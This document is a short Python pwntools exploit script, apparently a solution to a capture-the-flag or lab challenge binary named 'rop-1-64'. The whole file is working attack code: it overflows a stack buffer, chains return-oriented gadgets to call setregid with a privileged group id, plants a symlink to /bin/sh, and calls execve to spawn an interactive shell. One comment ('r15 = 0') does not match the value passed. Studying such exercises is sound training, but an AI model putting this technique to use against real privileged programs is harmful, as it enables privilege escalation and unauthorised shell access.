#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-1-64")

buf = "A"*0x80 + "B"*0x8

execve = p64(0x400560)
setregid = p64(0x400580)
path = p64(0x400726)

pop_rdi = p64(0x4007e3)
pop_rdx_rbp = p64(0x4006d8)
pop_rsi_r15 = p64(0x4007e1)

buf += pop_rdi
buf += p64(50001)  # rdi = 50001
buf += pop_rsi_r15
buf += p64(50001)  # rsi = 50001
buf += p64(50001)      # r15 = 0
buf += setregid

if os.path.exists('\x01'):
    os.unlink('\x01')

os.symlink("/bin/sh","\x01")

buf += pop_rdi
buf += path
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(0)
buf += p64(0)
buf += execve

p.sendline(buf)
p.interactive()
